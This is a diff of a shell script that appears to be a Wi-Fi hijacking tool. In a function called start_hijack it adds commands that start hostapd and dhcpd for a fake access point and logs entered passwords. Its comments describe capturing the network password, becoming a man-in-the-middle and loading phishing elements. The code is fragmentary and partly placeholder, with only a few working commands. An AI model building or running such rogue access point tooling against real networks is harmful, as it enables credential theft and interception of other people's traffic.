@@ -87,10 +87,16 @@ start_hijack()
     sudo iwconfig $1 mode managed
     sudo ifconfig $1 up
     sudo service NetworkManager restart
+    
+    # <<<<>>>> MAKE A COPY RN
+    
     #make your fake AP listening for correct password
+    sudo hostapd /etc/hostapd/hostapd.conf
+    sudo dhcpd
+    DATE=$(date +"%Y-%m-%d %H:%M:%S")
+    echo "Incorrect password entered on $DATE" >> /var/log/incorrect_passwords.log
 
-
-    #use captured password to establish real connection and became MITM
+    #use captured password to give a fake AP
 
 
     #load phishing elements
